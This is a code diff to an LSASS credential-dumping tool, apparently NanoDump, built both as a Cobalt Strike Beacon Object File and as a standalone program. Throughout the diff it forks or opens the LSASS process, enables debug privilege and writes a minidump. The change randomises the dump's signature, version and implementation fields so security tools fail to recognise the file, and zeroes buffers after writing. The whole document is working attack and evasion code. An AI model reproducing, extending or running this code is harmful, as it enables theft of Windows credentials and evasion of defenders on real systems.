@@ -468,27 +468,15 @@ HANDLE fork_lsass_process(
     return hCloneProcess;
 }
 
-ULONG32 convert_to_little_endian(
-    ULONG32 number
-)
-{
-    return  ((number & 0xff000000) >> 0x18) |
-            ((number & 0x00ff0000) >> 0x08) |
-            ((number & 0x0000ff00) << 0x08) |
-            ((number & 0x000000ff) << 0x18);
-}
-
 void write_header(
     Pdump_context dc
 )
 {
     MiniDumpHeader header;
     // the signature might or might not be valid
-    header.Signature = convert_to_little_endian(
-        *(ULONG32*)(dc->signature)
-    );
-    header.Version = 42899;
-    header.ImplementationVersion = 0;
+    header.Signature = dc->Signature;
+    header.Version = dc->Version;
+    header.ImplementationVersion = dc->ImplementationVersion;
     header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
     header.StreamDirectoryRva = 32;
     header.CheckSum = 0;
@@ -1258,6 +1246,8 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
             //return NULL;
         }
         append(dc, buffer, curr_range->DataSize);
+        // overwrite it first, just in case
+        MSVCRT$memset(buffer, 0, curr_range->DataSize);
         intFree(buffer); buffer = NULL;
         curr_range = curr_range->next;
     }
@@ -1401,20 +1391,34 @@ void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
     }
 }
 
-void generate_invalid_sig(char* signature)
+void generate_invalid_sig(
+    PULONG32 Signature,
+    PSHORT Version,
+    PSHORT ImplementationVersion
+)
 {
     time_t t;
     MSVCRT$srand((unsigned) MSVCRT$time(&t));
-    signature[0] = 'P';
-    signature[1] = 'M';
-    signature[2] = 'D';
-    signature[3] = 'M';
-    while (!MSVCRT$strncmp(signature, "PMDM", 4))
+
+    *Signature = 0x504d444d;
+    *Version = 42899;
+    *ImplementationVersion = 0;
+    while (*Signature == 0x504d444d ||
+           *Version == 42899 ||
+           *ImplementationVersion == 0)
     {
-        signature[0] = MSVCRT$rand() & 0xFF;
-        signature[1] = MSVCRT$rand() & 0xFF;
-        signature[2] = MSVCRT$rand() & 0xFF;
-        signature[3] = MSVCRT$rand() & 0xFF;
+        *Signature = 0;
+        *Signature |= (MSVCRT$rand() & 0x7FFF) << 0x11;
+        *Signature |= (MSVCRT$rand() & 0x7FFF) << 0x02;
+        *Signature |= (MSVCRT$rand() & 0x0003) << 0x00;
+
+        *Version = 0;
+        *Version |= (MSVCRT$rand() & 0xFF) << 0x08;
+        *Version |= (MSVCRT$rand() & 0xFF) << 0x00;
+
+        *ImplementationVersion = 0;
+        *ImplementationVersion |= (MSVCRT$rand() & 0xFF) << 0x08;
+        *ImplementationVersion |= (MSVCRT$rand() & 0xFF) << 0x00;
     }
 }
 
@@ -1712,14 +1716,17 @@ void encrypt_dump(
 #ifdef BOF
 void go(char* args, int length)
 {
-    datap  parser;
-    int    pid;
-    char*  dump_name;
-    BOOL   do_write;
-    BOOL   fork;
-    BOOL   dup;
-    BOOL   use_valid_sig;
-    BOOL   success;
+    datap   parser;
+    int     pid;
+    char*   dump_name;
+    BOOL    do_write;
+    BOOL    fork;
+    BOOL    dup;
+    BOOL    use_valid_sig;
+    BOOL    success;
+    ULONG32 Signature;
+    SHORT   Version;
+    SHORT   ImplementationVersion;
 
     BeaconDataParse(&parser, args, length);
     pid = BeaconDataInt(&parser);
@@ -1778,17 +1785,19 @@ void go(char* args, int length)
     }
 
     // set the signature
-    char signature[4];
     if (use_valid_sig)
     {
-        signature[0] = 'P';
-        signature[1] = 'M';
-        signature[2] = 'D';
-        signature[3] = 'M';
+        Signature = 0x504d444d;
+        Version = 42899;
+        ImplementationVersion = 0;
     }
     else
     {
-        generate_invalid_sig(signature);
+        generate_invalid_sig(
+            &Signature,
+            &Version,
+            &ImplementationVersion
+        );
     }
 
     success = enable_debug_priv();
@@ -1844,7 +1853,9 @@ void go(char* args, int length)
     dc.hProcess = hProcess;
     dc.BaseAddress = BaseAddress;
     dc.rva = 0;
-    dc.signature = signature;
+    dc.Signature = Signature;
+    dc.Version = Version;
+    dc.ImplementationVersion = ImplementationVersion;
 
     success = NanoDumpWriteDump(&dc);
 
@@ -1878,7 +1889,7 @@ void go(char* args, int length)
 
     if (success)
     {
-        if (MSVCRT$strncmp(signature, "PMDM", 4))
+        if (!use_valid_sig)
         {
             BeaconPrintf(
                 CALLBACK_OUTPUT,
@@ -1931,8 +1942,11 @@ int main(int argc, char* argv[])
     BOOL fork = FALSE;
     BOOL dup = FALSE;
     char* dump_name = NULL;
-    char signature[4];
+    ULONG32 Signature;
+    SHORT Version;
+    SHORT ImplementationVersion;
     BOOL success;
+    BOOL use_valid_sig = FALSE;
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1944,18 +1958,12 @@ int main(int argc, char* argv[])
     }
 #endif
 
-    // by default, set an invalid signature
-    generate_invalid_sig(signature);
-
     for (int i = 1; i < argc; ++i)
     {
         if (!strncmp(argv[i], "-v", 3) ||
             !strncmp(argv[i], "--valid", 8))
         {
-            signature[0] = 'P';
-            signature[1] = 'M';
-            signature[2] = 'D';
-            signature[3] = 'M';
+            use_valid_sig = TRUE;
         }
         else if (!strncmp(argv[i], "-w", 3) ||
                  !strncmp(argv[i], "--write", 8))
@@ -2021,6 +2029,22 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    // set the signature
+    if (use_valid_sig)
+    {
+        Signature = 0x504d444d;
+        Version = 42899;
+        ImplementationVersion = 0;
+    }
+    else
+    {
+        generate_invalid_sig(
+            &Signature,
+            &Version,
+            &ImplementationVersion
+        );
+    }
+
     success = enable_debug_priv();
     if (!success)
     {
@@ -2073,7 +2097,9 @@ int main(int argc, char* argv[])
     dc.hProcess = hProcess;
     dc.BaseAddress = BaseAddress;
     dc.rva = 0;
-    dc.signature = signature;
+    dc.Signature = Signature;
+    dc.Version = Version;
+    dc.ImplementationVersion = ImplementationVersion;
 
     success = NanoDumpWriteDump(&dc);
 
@@ -2096,7 +2122,7 @@ int main(int argc, char* argv[])
 
     if (success)
     {
-        if (MSVCRT$strncmp(signature, "PMDM", 4))
+        if (!use_valid_sig)
         {
             printf(
                 "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s\n",
